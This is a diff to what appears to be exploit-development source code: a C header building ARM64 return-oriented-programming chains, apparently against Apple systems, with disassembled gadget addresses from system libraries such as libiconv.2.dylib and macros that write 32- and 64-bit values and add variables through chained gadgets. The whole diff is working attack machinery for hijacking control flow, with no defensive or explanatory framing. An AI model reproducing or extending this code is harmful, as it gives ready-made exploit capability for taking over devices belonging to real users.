@@ -149,14 +149,14 @@ longjmp:
 	   180a81818	ADD     X0, X0, #1
 	   180a8181c    RET                          // pivoted
 
-str_x0_gadget:
+str_x0_gadget (from llvm):
             0x198ba668c      601600f9       str x0, [x19, 0x28]
             0x198ba6690      00008052       movz w0, 0
             0x198ba6694      fd7b41a9       ldp x29, x30, [sp, 0x10]
             0x198ba6698      f44fc2a8       ldp x20, x19, [sp], 0x20
             0x198ba669c      c0035fd6   
 
-cbz_x0_gadget:
+cbz_x0_gadget (from llvm):
 			┌──<  0x00349c54      400000b4       cbz x0, 0x349c5c
 			┌───< 0x00349c58      397e1d14       b 0xaa953c
 			│└──> 0x00349c5c      c0035fd6       ret 
@@ -164,6 +164,13 @@ cbz_x0_gadget:
 			└──>  0x00aa953c   *  b0a50bf0       adrp x16, 0x17f60000
 				  0x00aa9540      109a46f9       ldr x16, [x16, 0xd30]    ; [0xd30:4]=0
 				  0x00aa9544      00021fd6       br x16 
+
+add_x0_gadget (from libiconv.2.dylib):
+		    0x184f6992c      a002148b       add x0, x21, x20
+            0x184f69930      fd7b42a9       ldp x29, x30, [sp, 0x20]
+            0x184f69934      f44f41a9       ldp x20, x19, [sp, 0x10]
+            0x184f69938      f657c3a8       ldp x22, x21, [sp], 0x30
+            0x184f6993c      c0035fd6       ret
 
 */
 
@@ -267,7 +274,7 @@ cbz_x0_gadget:
 	new_rop_var->next = NULL; \
 	curr_rop_var = new_rop_var; 
 
-#define SET_ROP_VAR64_W_OFFSET(name,value,offset) \
+#define SET_ROP_VAR_RAW(name,value,offset,size) \
 	ADD_GADGET(); \
 	ADD_GADGET(); \
 	ADD_GADGET(); /* d9 */ \
@@ -276,7 +283,7 @@ cbz_x0_gadget:
 	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
 	ADD_ROP_VAR_GADGET_W_OFFSET(name,offset); /* x26 */ \
 	ADD_REL_OFFSET_GADGET(16); /* x25 */ \
-	ADD_STATIC_GADGET(8); /* x24 */ \
+	ADD_STATIC_GADGET(size); /* x24 */ \
 	ADD_STATIC_GADGET(value); /* x23 (the offset is pointing here) */ \
 	ADD_GADGET(); /* x22 */ \
 	ADD_GADGET(); /* x21 */ \
@@ -285,7 +292,10 @@ cbz_x0_gadget:
 	ADD_GADGET(); /* x29 */ \
 	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 
 
+#define SET_ROP_VAR64_W_OFFSET(name,value,offset) SET_ROP_VAR_RAW(name,value,offset,8)
 #define SET_ROP_VAR64(name,value) SET_ROP_VAR64_W_OFFSET(name,value,0)
+#define SET_ROP_VAR32_W_OFFSET(name,value,offset) SET_ROP_VAR_RAW(name,value,offset,4)
+#define SET_ROP_VAR32(name,value) SET_ROP_VAR32_W_OFFSET(name,value,0)
 
 #define SET_ROP_VAR64_TO_VAR_W_OFFSET(name,offset1,other_name,offset2) \
 	ADD_GADGET(); \
@@ -348,6 +358,11 @@ cbz_x0_gadget:
 	ADD_GADGET(); /* x29 */ \
 	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 
 
+// TODO: make this faster
+#define ROP_VAR_ADD(result,var1,var2) \
+	ROP_VAR_ARG64(var1,6); \
+	ROP_VAR_ARG64(var2,7); \
+	CALL_FUNC_RET_SAVE_VAR(result,(offsets->add_x0_gadget), 0,0,0,0,0,0,0,0);
 
 // this is here to set the arg of a func call to a pointer to our rop var
 // it will call memcpy and then copy the address of our gadget over the argument in the next function call (9*8 to get to the next function 7*8 to get to the args and then nr*8 to get to the arg)
